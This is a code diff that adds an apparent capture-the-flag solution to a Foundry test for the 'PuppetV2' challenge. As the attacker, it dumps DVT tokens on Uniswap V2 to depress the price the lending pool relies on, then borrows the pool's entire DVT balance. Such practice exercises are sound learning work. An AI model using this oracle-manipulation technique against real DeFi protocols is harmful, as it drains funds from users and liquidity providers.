@@ -117,8 +117,25 @@ contract PuppetV2 is Test {
     }
 
     function testExploit() public {
+        //Had a lot of difficulties for implementing my solution
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapV2Router), type(uint256).max);
+        weth.approve(address(puppetV2Pool), type(uint256).max);
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            1 ether,
+            path,
+            attacker,
+            DEADLINE
+        );
+        weth.deposit{value: attacker.balance}();
+        weth.withdraw(weth.balanceOf(msg.sender));
+        puppetV2Pool.borrow(dvt.balanceOf(address(puppetV2Pool)));
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
